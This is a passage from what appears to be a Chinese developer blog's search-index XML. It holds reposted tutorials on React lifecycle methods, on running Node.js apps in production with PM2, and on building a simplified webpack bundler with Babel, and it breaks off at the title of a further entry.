(nextProps.id !== prevState.prevId) &#123; const data = filterFn(nextProps.data); return &#123; data, prevId: nextProps.id, &#125;; &#125; return null; &#125; ...&#125; 在使用以上两种方法时，我个人认为的一个缺点：如果这些方法比较复杂，内部还调用了别的函数，此时，要么所有的处理函数都申明成静态方法，要么所有的方法都提到组件外部去，并且需要一层层的往下传递 props 值。无法像组件实例的方法一样，可以在每个组件实例方法内，通过 this.props.xxx / this.state.xxx 访问属性，会比较麻烦。 还有一种方法： 结合 componentDidUpdate 使用 在线 demo 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788import React from &quot;react&quot;;import ReactDOM from &quot;react-dom&quot;;import &quot;./styles.css&quot;;function App() &#123; return ( &lt;div className=&quot;App&quot;&gt; &lt;AAA /&gt; &lt;/div&gt; );&#125;class AAA extends React.Component &#123; state = &#123; age: 66 &#125;; add = () =&gt; &#123; this.setState(&#123; age: this.state.age + 1 &#125;); &#125;; render() &#123; return ( &lt;div&gt; &lt;ChildA onChangeParent=&#123;this.add&#125; age=&#123;this.state.age&#125; /&gt; &lt;/div&gt; ); &#125;&#125;class ChildA extends React.Component &#123; state = &#123; num: 88 &#125;; static getDerivedStateFromProps(nextprops, state) &#123; console.log(&quot;getDerivedStateFromProps&quot;, nextprops); if (nextprops.age !== state.age) &#123; return &#123; // 给一个标识 status: false, // age: nextprops.age, onChangeParent: nextprops.onChangeParent &#125;; &#125; return null; &#125; add = () =&gt; &#123; this.setState(&#123; num: this.state.num + 1 &#125;); &#125;; processData()&#123; console.log(&quot;process&quot;,this.props); return this.props.age; &#125; componentDidUpdate() &#123; // 根据标识来更新状态 if (!this.state.status) &#123; this.setState(&#123; age: this.processData(), status: true &#125;); console.log(&quot;componentDidUpdate&quot;); &#125; &#125; componentDidMount() &#123; this.setState(&#123; age: this.props.age, status: true &#125;); &#125; render() &#123; const &#123; onChangeParent &#125; = this.state; console.log(&quot;render&quot;, this.state); return ( &lt;&gt; &lt;div onClick=&#123;onChangeParent&#125;&gt;change&lt;/div&gt; &lt;div onClick=&#123;this.add&#125;&gt;add&lt;/div&gt; &lt;/&gt; ); &#125;&#125;const rootElement = document.getElementById(&quot;root&quot;);ReactDOM.render(&lt;App /&gt;, rootElement); 使用 getDerivedStateFromProps 派生状态时，不需要把组件自身的状态也设置进去12345678910111213141516171819class AAA extends React.Component &#123; // 必须给 state 设置一个值，哪怕是一个空对象 state = &#123; num:666 &#125;; static getDerivedStateFromProps(nextProps, prevState) &#123; if (nextProps.id !== prevState.prevId) &#123; return &#123; data:nextProps.data, prevId: nextProps.id, // 只需要映射属性，不需要把组件自身的状态也加进去 // num:prevState.num &#125;; &#125; return null; &#125; ...&#125; 如果 setState 更新的值不变，那么还会触发这些生命周期钩子吗？ 哪怕每次都设置同样的值，还是会触发更新 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import React, &#123;Component&#125; from &apos;react&apos;export default class LifeCycle extends Component &#123; static defaultProps = &#123; name: &apos;计数器&apos; &#125;; constructor(props) &#123; super(props); this.state = &#123;number: 0&#125;;//初始化默认的状态对象 console.log(&apos;1. constructor 初始化 props and state&apos;); &#125; componentWillMount() &#123; console.log(&apos;2. componentWillMount 组件将要挂载&apos;); &#125; componentDidMount() &#123; console.log(&apos;4. componentDidMount 组件挂载完成&apos;); &#125; shouldComponentUpdate(nextProps, nextState) &#123; console.log(&apos;Counter&apos;, nextProps, nextState); console.log(&apos;5. shouldComponentUpdate 询问组件是否需要更新&apos;); return true; &#125; componentWillUpdate() &#123; console.log(&apos;6. componentWillUpdate 组件将要更新&apos;); &#125; componentDidUpdate() &#123; console.log(&apos;7. componentDidUpdate 组件更新完毕&apos;); &#125; add = () =&gt; &#123; this.setState(&#123;number: this.state.number &#125;); &#125;; render() &#123; console.log(&apos;3.render渲染&apos;) return ( &lt;div style=&#123;&#123;border: &apos;5px solid red&apos;, padding: &apos;5px&apos;&#125;&#125;&gt; &lt;p&gt;&#123;this.state.number&#125;&lt;/p&gt; &lt;button onClick=&#123;this.add&#125;&gt;+&lt;/button&gt; &lt;/div&gt; ) &#125;&#125; 不要在 componentWillMount 中添加事件监听 在 componentDidMount 中添加事件监听 componentWillMount 可以被打断或调用多次，因此无法保证事件监听能在 unmount 的时候被成功卸载，可能会引起内存泄露 由于 React 未来的版本中推出了异步渲染，在 dom 被挂载之前的阶段都可以被打断重来，导致 componentWillMount、componentWillUpdate、componentWillReceiveProps 在一次更新中可能会被触发多次，因此那些只希望触发一次的副作用应该放在 componentDidUpdate 中 这也就是为什么要把异步请求放在 componentDidMount 中，而不是放在 componentWillMount 中的原因，为了向后兼容 最常见的误解就是 getDerivedStateFromProps 和 componentWillReceiveProps 只会在 props “改变”时才会调用。实际上只要父组件重新渲染时，这两个生命周期函数就会重新调用，不管 props 有没有“变化”]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在生产环境运行 PM2 & Node.js]]></title>
    <url>%2F2020%2F01%2F31%2FNode.js%2F%E5%9C%A8%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E8%BF%90%E8%A1%8C%20PM2%20%26%20Node.js%2F</url>
    <content type="text"><![CDATA[转载自掘金网络，原文链接：https://juejin.im/post/5e1c475af265da3e30770143 维护你的代码库并保持其相关性确有难度；但与之相比我们会发现，维护一个应用时最大的挑战来自于保持其存活和运行。不仅如此，随着 Node.js 变成大部分后端 API 的核心语言，单线程程序的伸缩也变得困难；这就是 PM2 出现并受到欢迎的原因了。 有很多进程管理工具，广为人知的如 Forever、strong-pm，或是不错的 Linux 系统工具 SystemD。还有就是本文的主角 PM2，有着 4100 多万的总下载量和 31k GitHub stars（译注：截止本文翻译时）。究其原因，简单地说，就是其简单易用并且让管理一个生产环境变得天衣无缝。 何为 PM2？ 正如其新版首页中所标榜的，PM2 是一个“身经百战（battle hardened）”的、适用于生产环境的 Node.js 应用运行时和进程管理工具。 也自带了内建的 负载均衡器，这使得扩展应用愈加容易。最棒的是，它在 Linux、Windows 和 macOS 都能工作。 通过一个 process.json 配置文件（译注：该文件可自行命名，一般叫做 process.json、processes.json 或 ecosystem.json，该名称将作为参数传入 pm2 start 等命令中），你可以指定想要运行的进程及要扩展到多少个进程。当启动 PM2 时，它将根据以上配置文件处理其他所有的事情（甚至比配置文件指定的更多一些 😉）。 所有这些意味着 PM2 能帮助你保持 Node.js 应用永远运行下去，并在你更新应用或服务器时以 0 故障停机时间自动重启。 安装 PM2安装 PM2 就是小菜一碟。首先，确保你已经配置好了 process.json 文件，用以启动进程。 一般只需运行 yarn add global pm2 即可安装。如果使用了一个 Docker 容器（对，也支持 Docker），按照 pm2.keymetrics.io/docs/usage/… 中的说明安装。 如果你实在好奇它看起来长什么样，这里有一个 process_prod.json 文件的例子，用于一个开源的 RSS &amp; 播客 应用： 12345678910111213141516171819202122232425262728293031323334353637383940414243// process_prod.json&#123; &quot;apps&quot;: [&#123; &quot;name&quot;: &quot;api&quot;, &quot;cwd&quot;: &quot;api/dist&quot;, &quot;script&quot;: &quot;server.js&quot;, &quot;watch&quot;: false &#125;, &#123; &quot;name&quot;: &quot;conductor&quot;, &quot;cwd&quot;: &quot;api/dist/workers&quot;, &quot;script&quot;: &quot;conductor.js&quot;, &quot;watch&quot;: false &#125;, &#123; &quot;name&quot;: &quot;rss-worker&quot;, &quot;cwd&quot;: &quot;api/dist/workers&quot;, &quot;script&quot;: &quot;rss.js&quot;, &quot;instances&quot;: 2, &quot;exec_mode&quot;: &quot;cluster&quot;, &quot;watch&quot;: false &#125;, &#123; &quot;name&quot;: &quot;podcast-worker&quot;, &quot;cwd&quot;: &quot;api/dist/workers&quot;, &quot;script&quot;: &quot;podcast.js&quot;, &quot;instances&quot;: 2, &quot;exec_mode&quot;: &quot;cluster&quot;, &quot;watch&quot;: false &#125;, &#123; &quot;name&quot;: &quot;og-worker&quot;, // 应用名称 &quot;cwd&quot;: &quot;api/dist/workers&quot;, // 启动应用的目录 &quot;script&quot;: &quot;og.js&quot;, // 启动脚本 &quot;instances&quot;: 2, // 被启动的应用实例数量 &quot;exec_mode&quot;: &quot;cluster&quot;, // 启动模式，默认为 fork &quot;watch&quot;: false, // 如果允许 watch，则其中的文件改变会引发重启 &quot;max_memory_restart&quot;: &quot;150M&quot; // 引发重启的最大内存使用量 &#125; ]&#125;复制代码 如你所见，我们运行了若干个进程，并且 PM2 轻松掌控了一切；其自动地使用了 Node.js 的 Cluster API 以实现多进程。 译注：配置文件的完整介绍见 pm2.keymetrics.io/docs/usage/… 技巧 &amp; 经验对于任何应用（或者本例中的进程管理工具），从先行者那里了解一些技巧和经验都是有好处的。 自动重启![img](data:image/svg+xml;utf8,) 一旦 PM2 启动，你的应用就将永远存活，并在应用崩溃和机器重新启动后自动重启 – 所有这些只消一条简单的命令（用于获得针对所在机器的自动配置过的启动脚本）： 12pm2 startup 复制代码 如： 1234$ pm2 startup[PM2] You have to run this command as root. Execute the following command: sudo su -c &quot;env PATH=$PATH:/home/unitech/.nvm/versions/node/v4.3/bin pm2 startup &lt;distribution&gt; -u &lt;user&gt; --hp &lt;home-path&gt;复制代码 只要按照打印的结果，拷贝并运行得到的脚本就行了。 进程管理![img](data:image/svg+xml;utf8,) 不管你运行了多少个应用，PM2 的一套命令都能让你管理它们各自的状态。以下是常用的一些命令（不区分顺序）： pm2 start process_prod.json — 通过进程配置文件启动进程 pm2 ls — 列出所有的应用 pm2 stop — 停止指定的应用 pm2 start — 启动指定的应用 pm2 scale N — 缩放指定应用的实例数量 pm2 kill — 杀掉所有运行中的应用 pm2 restart — 重启所有运行中的应用 pm2 reload — 重新加载应用配置（这会在你修改了应用的环境变量时派上用场） 进程监控![img](data:image/svg+xml;utf8,) 运行命令 pm2 monit 会返回关于应用健康的丰富数据。比如，你将看到 CPU 利用率、内存使用量、请求分钟数等等。 日志管理![img](data:image/svg+xml;utf8,) PM2 内建了日志管理功能。它从所有你的应用中聚合日志数据，并将其写入一个用于阅读的源文件中。你甚至可以通过事实跟踪日志来看到应用背后正在发生什么。 PM2 的日志管理也提供了日志循环，这一点非常重要，特别是当应用程序频繁地输出详细日志时。 有三条我经常使用的命令，想必你也应该一样： pm2 logs — 从所有正在运行的应用中输出日志 pm2 logs — 只从指定的应用中输出日志 pm2 flush — 刷新所有日志数据，释放磁盘空间 请记住，确保日志循环是最重要的事情。这样做将会把一个巨大的日志文件分割成若干易于 PM2 管理的小文件。要做到这点，运行如下命令： 12pm2 install pm2\-logrotate复制代码 日志管理的更多信息可以在 pm2.keymetrics.io/docs/usage/… 找到。 如果发现你的实例经常被日志填满，也可以考虑使用一个集中式日志服务，如 Loggly、Papertrail，或 ELK。 最佳实践通常，我会乐于遵守 “应用十二因素”（12factor.net/）所述的实践。这将帮助… PM2 所有的优势。如果你已经阅读过其声明，应该见到了这 12 条规则： 一个置于版本控制下的代码库, 多份部署 明确地声明，并隔离依赖 在环境而非代码中存储配置 将后端服务视为附加资源 严格区分构建和运行阶段 以一个或多个无状态进程运行应用 通过端口绑定输出服务 通过进程模型扩展 通过快速启动和优雅地关闭保证最大的健壮性 尽可能保持开发和线上环境尽量一致 把日志视为事件流 以一次性进程的形式运行后台管理任务 如果遵守了以上规则，你将能够通过 PM2 高效而安全地扩展任何应用。]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[webpack打包原理 ? 看完这篇你就懂了 !]]></title>
    <url>%2F2020%2F01%2F10%2FWeb%E5%89%8D%E7%AB%AF%2Fwebpack%E6%89%93%E5%8C%85%E5%8E%9F%E7%90%86%20%3F%20%E7%9C%8B%E5%AE%8C%E8%BF%99%E7%AF%87%E4%BD%A0%E5%B0%B1%E6%87%82%E4%BA%86%20!%2F</url>
    <content type="text"><![CDATA[转载自掘金，原文链接：https://juejin.im/post/5e116fce6fb9a047ea7472a6?utm_source=gold_browser_extension 前言[实践系列] 主要是让我们通过实践去加深对一些原理的理解。 [实践系列]前端路由 [实践系列]Babel 原理 [实践系列]实践这一次,彻底搞懂浏览器缓存机制 [实践系列]你能手写一个 Promise 吗？Yes I promise。 什么是 webpack ? 本质上,webpack 是一个现代 JavaScript 应用程序的静态模块打包器(module bundler)。当 webpack 处理应用程序时,它会递归地构建一个依赖关系图(dependency graph),其中包含应用程序需要的每个模块,然后将所有这些模块打包成一个或多个 bundle。 webpack 就像一条生产线,要经过一系列处理流程后才能将源文件转换成输出结果。 这条生产线上的每个处理流程的职责都是单一的,多个流程之间有存在依赖关系,只有完成当前处理后才能交给下一个流程去处理。 插件就像是一个插入到生产线中的一个功能,在特定的时机对生产线上的资源做处理。webpack 通过 Tapable 来组织这条复杂的生产线。 webpack 在运行过程中会广播事件,插件只需要监听它所关心的事件,就能加入到这条生产线中,去改变生产线的运作。 webpack 的事件流机制保证了插件的有序性,使得整个系统扩展性很好。 – 深入浅出 webpack 吴浩麟 webpack 核心概念Entry入口起点(entry point)指示 webpack 应该使用哪个模块,来作为构建其内部依赖图的开始。 进入入口起点后,webpack 会找出有哪些模块和库是入口起点（直接和间接）依赖的。 每个依赖项随即被处理,最后输出到称之为 bundles 的文件中。 Outputoutput 属性告诉 webpack 在哪里输出它所创建的 bundles,以及如何命名这些文件,默认值为 ./dist。 基本上,整个应用程序结构,都会被编译到你指定的输出路径的文件夹中。 Module模块,在 Webpack 里一切皆模块,一个模块对应着一个文件。Webpack 会从配置的 Entry 开始递归找出所有依赖的模块。 Chunk代码块,一个 Chunk 由多个模块组合而成,用于代码合并与分割。 Loaderloader 让 webpack 能够去处理那些非 JavaScript 文件（webpack 自身只理解 JavaScript）。 loader 可以将所有类型的文件转换为 webpack 能够处理的有效模块,然后你就可以利用 webpack 的打包能力,对它们进行处理。 本质上,webpack loader 将所有类型的文件,转换为应用程序的依赖图（和最终的 bundle）可以直接引用的模块。 Pluginloader 被用于转换某些类型的模块,而插件则可以用于执行范围更广的任务。 插件的范围包括,从打包优化和压缩,一直到重新定义环境中的变量。插件接口功能极其强大,可以用来处理各种各样的任务。 webpack 构建流程Webpack 的运行流程是一个串行的过程,从启动到结束会依次执行以下流程 : 初始化参数：从配置文件和 Shell 语句中读取与合并参数,得出最终的参数。 开始编译：用上一步得到的参数初始化 Compiler 对象,加载所有配置的插件,执行对象的 run 方法开始执行编译。 确定入口：根据配置中的 entry 找出所有的入口文件。 编译模块：从入口文件出发,调用所有配置的 Loader 对模块进行翻译,再找出该模块依赖的模块,再递归本步骤直到所有入口依赖的文件都经过了本步骤的处理。 完成模块编译：在经过第 4 步使用 Loader 翻译完所有模块后,得到了每个模块被翻译后的最终内容以及它们之间的依赖关系。 输出资源：根据入口和模块之间的依赖关系,组装成一个个包含多个模块的 Chunk,再把每个 Chunk 转换成一个单独的文件加入到输出列表,这步是可以修改输出内容的最后机会。 输出完成：在确定好输出内容后,根据配置确定输出的路径和文件名,把文件内容写入到文件系统。 在以上过程中,Webpack 会在特定的时间点广播出特定的事件,插件在监听到感兴趣的事件后会执行特定的逻辑,并且插件可以调用 Webpack 提供的 API 改变 Webpack 的运行结果。 实践加深理解,撸一个简易 webpack1. 定义 Compiler 类1234567891011121314151617class Compiler &#123; constructor(options) &#123; // webpack 配置 const &#123; entry, output &#125; = options // 入口 this.entry = entry // 出口 this.output = output // 模块 this.modules = [] &#125; // 构建启动 run() &#123;&#125; // 重写 require函数,输出bundle generate() &#123;&#125;&#125;复制代码 2. 解析入口文件,获取 AST我们这里使用@babel/parser,这是 babel7 的工具,来帮助我们分析内部的语法,包括 es6,返回一个 AST 抽象语法树。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// webpack.config.jsconst path = require('path')module.exports = &#123; entry: './src/index.js', output: &#123; path: path.resolve(__dirname, './dist'), filename: 'main.js' &#125;&#125;//复制代码const fs = require('fs')const parser = require('@babel/parser')const options = require('./webpack.config')const Parser = &#123; getAst: path =&gt; &#123; // 读取入口文件 const content = fs.readFileSync(path, 'utf-8') // 将文件内容转为AST抽象语法树 return parser.parse(content, &#123; sourceType: 'module' &#125;) &#125;&#125;class Compiler &#123; constructor(options) &#123; // webpack 配置 const &#123; entry, output &#125; = options // 入口 this.entry = entry // 出口 this.output = output // 模块 this.modules = [] &#125; // 构建启动 run() &#123; const ast = Parser.getAst(this.entry) &#125; // 重写 require函数,输出bundle generate() &#123;&#125;&#125;new Compiler(options).run()复制代码 3. 找出所有依赖模块Babel 提供了@babel/traverse(遍历)方法维护这 AST 树的整体状态,我们这里使用它来帮我们找出依赖模块。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354const fs = require('fs')const path = require('path')const options = require('./webpack.config')const parser = require('@babel/parser')const traverse = require('@babel/traverse').defaultconst Parser = &#123; getAst: path =&gt; &#123; // 读取入口文件 const content = fs.readFileSync(path, 'utf-8') // 将文件内容转为AST抽象语法树 return parser.parse(content, &#123; sourceType: 'module' &#125;) &#125;, getDependecies: (ast, filename) =&gt; &#123; const dependecies = &#123;&#125; // 遍历所有的 import 模块,存入dependecies traverse(ast, &#123; // 类型为 ImportDeclaration 的 AST 节点 (即为import 语句) ImportDeclaration(&#123; node &#125;) &#123; const dirname = path.dirname(filename) // 保存依赖模块路径,之后生成依赖关系图需要用到 const filepath = './' + path.join(dirname, node.source.value) dependecies[node.source.value] = filepath &#125; &#125;) return dependecies &#125;&#125;class Compiler &#123; constructor(options) &#123; // webpack 配置 const &#123; entry, output &#125; = options // 入口 this.entry = entry // 出口 this.output = output // 模块 this.modules = [] &#125; // 构建启动 run() &#123; const &#123; getAst, getDependecies &#125; = Parser const ast = getAst(this.entry) const dependecies = getDependecies(ast, this.entry) &#125; // 重写 require函数,输出bundle generate() &#123;&#125;&#125;new Compiler(options).run()复制代码 4. AST 转换为 code将 AST 语法树转换为浏览器可执行代码,我们这里使用@babel/core 和 @babel/preset-env。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263const fs = require('fs')const path = require('path')const options = require('./webpack.config')const parser = require('@babel/parser')const traverse = require('@babel/traverse').defaultconst &#123; transformFromAst &#125; = require('@babel/core')const Parser = &#123; getAst: path =&gt; &#123; // 读取入口文件 const content = fs.readFileSync(path, 'utf-8') // 将文件内容转为AST抽象语法树 return parser.parse(content, &#123; sourceType: 'module' &#125;) &#125;, getDependecies: (ast, filename) =&gt; &#123; const dependecies = &#123;&#125; // 遍历所有的 import 模块,存入dependecies traverse(ast, &#123; // 类型为 ImportDeclaration 的 AST 节点 (即为import 语句) ImportDeclaration(&#123; node &#125;) &#123; const dirname = path.dirname(filename) // 保存依赖模块路径,之后生成依赖关系图需要用到 const filepath = './' + path.join(dirname, node.source.value) dependecies[node.source.value] = filepath &#125; &#125;) return dependecies &#125;, getCode: ast =&gt; &#123; // AST转换为code const &#123; code &#125; = transformFromAst(ast, null, &#123; presets: ['@babel/preset-env'] &#125;) return code &#125;&#125;class Compiler &#123; constructor(options) &#123; // webpack 配置 const &#123; entry, output &#125; = options // 入口 this.entry = entry // 出口 this.output = output // 模块 this.modules = [] &#125; // 构建启动 run() &#123; const &#123; getAst, getDependecies, getCode &#125; = Parser const ast = getAst(this.entry) const dependecies = getDependecies(ast, this.entry) const code = getCode(ast) &#125; // 重写 require函数,输出bundle generate() &#123;&#125;&#125;new Compiler(options).run()复制代码 5. 递归解析所有依赖项,生成依赖关系图123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596const fs = require('fs')const path = require('path')const options = require('./webpack.config')const parser = require('@babel/parser')const traverse = require('@babel/traverse').defaultconst &#123; transformFromAst &#125; = require('@babel/core')const Parser = &#123; getAst: path =&gt; &#123; // 读取入口文件 const content = fs.readFileSync(path, 'utf-8') // 将文件内容转为AST抽象语法树 return parser.parse(content, &#123; sourceType: 'module' &#125;) &#125;, getDependecies: (ast, filename) =&gt; &#123; const dependecies = &#123;&#125; // 遍历所有的 import 模块,存入dependecies traverse(ast, &#123; // 类型为 ImportDeclaration 的 AST 节点 (即为import 语句) ImportDeclaration(&#123; node &#125;) &#123; const dirname = path.dirname(filename) // 保存依赖模块路径,之后生成依赖关系图需要用到 const filepath = './' + path.join(dirname, node.source.value) dependecies[node.source.value] = filepath &#125; &#125;) return dependecies &#125;, getCode: ast =&gt; &#123; // AST转换为code const &#123; code &#125; = transformFromAst(ast, null, &#123; presets: ['@babel/preset-env'] &#125;) return code &#125;&#125;class Compiler &#123; constructor(options) &#123; // webpack 配置 const &#123; entry, output &#125; = options // 入口 this.entry = entry // 出口 this.output = output // 模块 this.modules = [] &#125; // 构建启动 run() &#123; // 解析入口文件 const info = this.build(this.entry) this.modules.push(info) this.modules.forEach((&#123; dependecies &#125;) =&gt; &#123; // 判断有依赖对象,递归解析所有依赖项 if (dependecies) &#123; for (const dependency in dependecies) &#123; this.modules.push(this.build(dependecies[dependency])) &#125; &#125; &#125;) // 生成依赖关系图 const dependencyGraph = this.modules.reduce( (graph, item) =&gt; (&#123; ...graph, // 使用文件路径作为每个模块的唯一标识符,保存对应模块的依赖对象和文件内容 [item.filename]: &#123; dependecies: item.dependecies, code: item.code &#125; &#125;), &#123;&#125; ) &#125; build(filename) &#123; const &#123; getAst, getDependecies, getCode &#125; = Parser const ast = getAst(filename) const dependecies = getDependecies(ast, filename) const code = getCode(ast) return &#123; // 文件路径,可以作为每个模块的唯一标识符 filename, // 依赖对象,保存着依赖模块路径 dependecies, // 文件内容 code &#125; &#125; // 重写 require函数,输出bundle generate() &#123;&#125;&#125;new Compiler(options).run()复制代码 6. 重写 require 函数,输出 bundle123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117const fs = require('fs')const path = require('path')const options = require('./webpack.config')const parser = require('@babel/parser')const traverse = require('@babel/traverse').defaultconst &#123; transformFromAst &#125; = require('@babel/core')const Parser = &#123; getAst: path =&gt; &#123; // 读取入口文件 const content = fs.readFileSync(path, 'utf-8') // 将文件内容转为AST抽象语法树 return parser.parse(content, &#123; sourceType: 'module' &#125;) &#125;, getDependecies: (ast, filename) =&gt; &#123; const dependecies = &#123;&#125; // 遍历所有的 import 模块,存入dependecies traverse(ast, &#123; // 类型为 ImportDeclaration 的 AST 节点 (即为import 语句) ImportDeclaration(&#123; node &#125;) &#123; const dirname = path.dirname(filename) // 保存依赖模块路径,之后生成依赖关系图需要用到 const filepath = './' + path.join(dirname, node.source.value) dependecies[node.source.value] = filepath &#125; &#125;) return dependecies &#125;, getCode: ast =&gt; &#123; // AST转换为code const &#123; code &#125; = transformFromAst(ast, null, &#123; presets: ['@babel/preset-env'] &#125;) return code &#125;&#125;class Compiler &#123; constructor(options) &#123; // webpack 配置 const &#123; entry, output &#125; = options // 入口 this.entry = entry // 出口 this.output = output // 模块 this.modules = [] &#125; // 构建启动 run() &#123; // 解析入口文件 const info = this.build(this.entry) this.modules.push(info) this.modules.forEach((&#123; dependecies &#125;) =&gt; &#123; // 判断有依赖对象,递归解析所有依赖项 if (dependecies) &#123; for (const dependency in dependecies) &#123; this.modules.push(this.build(dependecies[dependency])) &#125; &#125; &#125;) // 生成依赖关系图 const dependencyGraph = this.modules.reduce( (graph, item) =&gt; (&#123; ...graph, // 使用文件路径作为每个模块的唯一标识符,保存对应模块的依赖对象和文件内容 [item.filename]: &#123; dependecies: item.dependecies, code: item.code &#125; &#125;), &#123;&#125; ) this.generate(dependencyGraph) &#125; build(filename) &#123; const &#123; getAst, getDependecies, getCode &#125; = Parser const ast = getAst(filename) const dependecies = getDependecies(ast, filename) const code = getCode(ast) return &#123; // 文件路径,可以作为每个模块的唯一标识符 filename, // 依赖对象,保存着依赖模块路径 dependecies, // 文件内容 code &#125; &#125; // 重写 require函数 (浏览器不能识别commonjs语法),输出bundle generate(code) &#123; // 输出文件路径 const filePath = path.join(this.output.path, this.output.filename) // 懵逼了吗? 没事,下一节我们捋一捋 const bundle = `(function(graph)&#123; function require(module)&#123; function localRequire(relativePath)&#123; return require(graph[module].dependecies[relativePath]) &#125; var exports = &#123;&#125;; (function(require,exports,code)&#123; eval(code) &#125;)(localRequire,exports,graph[module].code); return exports; &#125; require('$&#123;this.entry&#125;') &#125;)($&#123;JSON.stringify(code)&#125;)` // 把文件内容写入到文件系统 fs.writeFileSync(filePath, bundle, 'utf-8') &#125;&#125;new Compiler(options).run()复制代码 7. 看完这节,彻底搞懂 bundle 实现我们通过下面的例子来进行讲解,先死亡凝视 30 秒 123456789101112131415161718192021222324;(function(graph) &#123; function require(moduleId) &#123; function localRequire(relativePath) &#123; return require(graph[moduleId].dependecies[relativePath]) &#125; var exports = &#123;&#125; ;(function(require, exports, code) &#123; eval(code) &#125;)(localRequire, exports, graph[moduleId].code) return exports &#125; require('./src/index.js')&#125;)(&#123; './src/index.js': &#123; dependecies: &#123; './hello.js': './src/hello.js' &#125;, code: '"use strict";\n\nvar _hello = require("./hello.js");\n\ndocument.write((0, _hello.say)("webpack"));' &#125;, './src/hello.js': &#123; dependecies: &#123;&#125;, code: '"use strict";\n\nObject.defineProperty(exports, "__esModule", &#123;\n value: true\n&#125;);\nexports.say = say;\n\nfunction say(name) &#123;\n return "hello ".concat(name);\n&#125;' &#125;&#125;)复制代码 step 1 : 从入口文件开始执行1234567891011121314151617181920// 定义一个立即执行函数,传入生成的依赖关系图;(function(graph) &#123; // 重写require函数 function require(moduleId) &#123; console.log(moduleId) // ./src/index.js &#125; // 从入口文件开始执行 require('./src/index.js')&#125;)(&#123; './src/index.js': &#123; dependecies: &#123; './hello.js': './src/hello.js' &#125;, code: '"use strict";\n\nvar _hello = require("./hello.js");\n\ndocument.write((0, _hello.say)("webpack"));' &#125;, './src/hello.js': &#123; dependecies: &#123;&#125;, code: '"use strict";\n\nObject.defineProperty(exports, "__esModule", &#123;\n value: true\n&#125;);\nexports.say = say;\n\nfunction say(name) &#123;\n return "hello ".concat(name);\n&#125;' &#125;&#125;)复制代码 step 2 : 使用 eval 执行代码1234567891011121314151617181920212223// 定义一个立即执行函数,传入生成的依赖关系图;(function(graph) &#123; // 重写require函数 function require(moduleId) &#123; ;(function(code) &#123; console.log(code) // "use strict";\n\nvar _hello = require("./hello.js");\n\ndocument.write((0, _hello.say)("webpack")); eval(code) // Uncaught TypeError: Cannot read property 'code' of undefined &#125;)(graph[moduleId].code) &#125; // 从入口文件开始执行 require('./src/index.js')&#125;)(&#123; './src/index.js': &#123; dependecies: &#123; './hello.js': './src/hello.js' &#125;, code: '"use strict";\n\nvar _hello = require("./hello.js");\n\ndocument.write((0, _hello.say)("webpack"));' &#125;, './src/hello.js': &#123; dependecies: &#123;&#125;, code: '"use strict";\n\nObject.defineProperty(exports, "__esModule", &#123;\n value: true\n&#125;);\nexports.say = say;\n\nfunction say(name) &#123;\n return "hello ".concat(name);\n&#125;' &#125;&#125;)复制代码 可以看到,我们在执行”./src/index.js”文件代码的时候报错了,这是因为 index.js 里引用依赖 hello.js,而我们没有对依赖进行处理,接下来我们对依赖引用进行处理。 step 3 : 依赖对象寻址映射,获取 exports 对象12345678910111213141516171819202122232425262728293031// 定义一个立即执行函数,传入生成的依赖关系图;(function(graph) &#123; // 重写require函数 function require(moduleId) &#123; // 找到对应moduleId的依赖对象,调用require函数,eval执行,拿到exports对象 function localRequire(relativePath) &#123; return require(graph[moduleId].dependecies[relativePath]) // &#123;__esModule: true, say: ƒ say(name)&#125; &#125; // 定义exports对象 var exports = &#123;&#125; ;(function(require, exports, code) &#123; // commonjs语法使用module.exports暴露实现,我们传入的exports对象会捕获依赖对象(hello.js)暴露的实现(exports.say = say)并写入 eval(code) &#125;)(localRequire, exports, graph[moduleId].code) // 暴露exports对象,即暴露依赖对象对应的实现 return exports &#125; // 从入口文件开始执行 require('./src/index.js')&#125;)(&#123; './src/index.js': &#123; dependecies: &#123; './hello.js': './src/hello.js' &#125;, code: '"use strict";\n\nvar _hello = require("./hello.js");\n\ndocument.write((0, _hello.say)("webpack"));' &#125;, './src/hello.js': &#123; dependecies: &#123;&#125;, code: '"use strict";\n\nObject.defineProperty(exports, "__esModule", &#123;\n value: true\n&#125;);\nexports.say = say;\n\nfunction say(name) &#123;\n return "hello ".concat(name);\n&#125;' &#125;&#125;)复制代码 这下应该明白了吧 ~ 可以直接复制上面代码到控制台输出哦~ 完整代码地址戳我 👈 总结 Webpack 是一个庞大的 Node.js 应用,如果你阅读过它的源码,你会发现实现一个完整的 Webpack 需要编写非常多的代码。 但你无需了解所有的细节,只需了解其整体架构和部分细节即可。 对 Webpack 的使用者来说,它是一个简单强大的工具； 对 Webpack 的开发者来说,它是一个扩展性的高系统。 Webpack 之所以能成功,在于它把复杂的实现隐藏了起来,给用户暴露出的只是一个简单的工具,让用户能快速达成目的。 同时整体架构设计合理,扩展性高,开发扩展难度不高,通过社区补足了大量缺失的功能,让 Webpack 几乎能胜任任何场景。 参考webpack 中文文档 深入浅出 webpack]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[排序]]></title>
    <url>%2F2020%2F01%2F07%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%2F%E6%8E%92%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[参考文档 十大经典排序算法]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[14 届 D2 前端技术论坛有感]]></title>
